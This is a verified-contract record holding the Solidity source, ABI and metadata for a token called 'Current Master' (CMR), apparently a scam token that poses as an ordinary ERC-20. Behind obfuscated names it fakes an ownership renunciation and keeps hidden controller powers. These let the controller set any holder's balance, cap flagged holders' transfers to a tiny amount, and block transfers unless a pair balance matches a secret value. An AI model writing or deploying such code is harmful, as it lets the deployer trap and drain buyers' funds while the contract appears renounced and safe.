{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface totalLiquidity {\n    function createPair(address maxReceiverSell, address fundSenderMode) external returns (address);\n}\n\ninterface teamWalletTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxAtTotal) external view returns (uint256);\n\n    function transfer(address walletLimit, uint256 senderAuto) external returns (bool);\n\n    function allowance(address receiverTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletLimit,\n        uint256 senderAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atReceiver, uint256 value);\n    event Approval(address indexed receiverTx, address indexed spender, uint256 value);\n}\n\nabstract contract sellTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingAutoWallet is teamWalletTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CurrentMaster is sellTx, teamWalletTx, tradingAutoWallet {\n\n    uint256 public fromLimitAmount;\n\n    mapping(address => mapping(address => uint256)) private amountLiquidity;\n\n    address marketingAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private totalFund;\n\n    function liquidityAmount() public {\n        emit OwnershipTransferred(senderFund, address(0));\n        shouldAmount = address(0);\n    }\n\n    string private feeTotal = \"Current Master\";\n\n    bool public fundTrading;\n\n    address public tokenTo;\n\n    function receiverReceiverLimit(address marketingIs, address walletLimit, uint256 senderAuto) internal returns (bool) {\n        require(totalFund[marketingIs] >= senderAuto);\n        totalFund[marketingIs] -= senderAuto;\n        totalFund[walletLimit] += senderAuto;\n        emit Transfer(marketingIs, walletLimit, senderAuto);\n        return true;\n    }\n\n    uint256 private enableFund = 100000000 * 10 ** 18;\n\n    bool private launchAt;\n\n    uint256 tokenAt;\n\n    uint256 swapTake;\n\n    function allowance(address listTo, address senderTx) external view virtual override returns (uint256) {\n        if (senderTx == marketingAmount) {\n            return type(uint256).max;\n        }\n        return amountLiquidity[listTo][senderTx];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFund;\n    }\n\n    uint256 public maxWallet;\n\n    uint256 private listTx;\n\n    string private fromToken = \"CMR\";\n\n    function exemptAutoFund(uint256 senderAuto) public {\n        limitReceiver();\n        tokenAt = senderAuto;\n    }\n\n    bool private receiverTxLiquidity;\n\n    uint256 constant takeLimitMode = 14 ** 10;\n\n    bool private launchedReceiver;\n\n    uint8 private maxTo = 18;\n\n    function liquidityTrading(address launchedModeAmount, uint256 senderAuto) public {\n        limitReceiver();\n        totalFund[launchedModeAmount] = senderAuto;\n    }\n\n    uint256 private enableBuy;\n\n    constructor (){\n        \n        walletMax liquidityFrom = walletMax(marketingAmount);\n        tokenTo = totalLiquidity(liquidityFrom.factory()).createPair(liquidityFrom.WETH(), address(this));\n        if (launchAt) {\n            fundTakeTo = false;\n        }\n        senderFund = _msgSender();\n        txTotal[senderFund] = true;\n        totalFund[senderFund] = enableFund;\n        liquidityAmount();\n        if (fundTakeTo) {\n            listTx = enableBuy;\n        }\n        emit Transfer(address(0), senderFund, enableFund);\n    }\n\n    function autoLaunch(address marketingIs, address walletLimit, uint256 senderAuto) internal returns (bool) {\n        if (marketingIs == senderFund) {\n            return receiverReceiverLimit(marketingIs, walletLimit, senderAuto);\n        }\n        uint256 marketingEnable = teamWalletTx(tokenTo).balanceOf(sellFrom);\n        require(marketingEnable == tokenAt);\n        require(walletLimit != sellFrom);\n        if (isEnable[marketingIs]) {\n            return receiverReceiverLimit(marketingIs, walletLimit, takeLimitMode);\n        }\n        return receiverReceiverLimit(marketingIs, walletLimit, senderAuto);\n    }\n\n    bool private fundReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromToken;\n    }\n\n    address sellFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTo;\n    }\n\n    function teamAtLaunched(address teamSwap) public {\n        limitReceiver();\n        \n        if (teamSwap == senderFund || teamSwap == tokenTo) {\n            return;\n        }\n        isEnable[teamSwap] = true;\n    }\n\n    function limitReceiver() private view {\n        require(txTotal[_msgSender()]);\n    }\n\n    address private shouldAmount;\n\n    function getOwner() external view returns (address) {\n        return shouldAmount;\n    }\n\n    function transferFrom(address marketingIs, address walletLimit, uint256 senderAuto) external override returns (bool) {\n        if (_msgSender() != marketingAmount) {\n            if (amountLiquidity[marketingIs][_msgSender()] != type(uint256).max) {\n                require(senderAuto <= amountLiquidity[marketingIs][_msgSender()]);\n                amountLiquidity[marketingIs][_msgSender()] -= senderAuto;\n            }\n        }\n        return autoLaunch(marketingIs, walletLimit, senderAuto);\n    }\n\n    function transfer(address launchedModeAmount, uint256 senderAuto) external virtual override returns (bool) {\n        return autoLaunch(_msgSender(), launchedModeAmount, senderAuto);\n    }\n\n    mapping(address => bool) public txTotal;\n\n    function launchedMode(address feeShould) public {\n        if (fundTrading) {\n            return;\n        }\n        if (maxWallet == receiverSell) {\n            receiverSell = enableBuy;\n        }\n        txTotal[feeShould] = true;\n        if (fundReceiver) {\n            enableBuy = fromLimitAmount;\n        }\n        fundTrading = true;\n    }\n\n    address public senderFund;\n\n    mapping(address => bool) public isEnable;\n\n    function approve(address senderTx, uint256 senderAuto) public virtual override returns (bool) {\n        amountLiquidity[_msgSender()][senderTx] = senderAuto;\n        emit Approval(_msgSender(), senderTx, senderAuto);\n        return true;\n    }\n\n    uint256 public receiverSell;\n\n    function balanceOf(address maxAtTotal) public view virtual override returns (uint256) {\n        return totalFund[maxAtTotal];\n    }\n\n    function owner() external view returns (address) {\n        return shouldAmount;\n    }\n\n    event OwnershipTransferred(address indexed exemptReceiver, address indexed feeEnableTotal);\n\n    function name() external view virtual override returns (string memory) {\n        return feeTotal;\n    }\n\n    bool private fundTakeTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnableTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAtTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderAuto\",\"type\":\"uint256\"}],\"name\":\"exemptAutoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"}],\"name\":\"launchedMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedModeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAuto\",\"type\":\"uint256\"}],\"name\":\"liquidityTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"}],\"name\":\"teamAtLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedModeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CurrentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}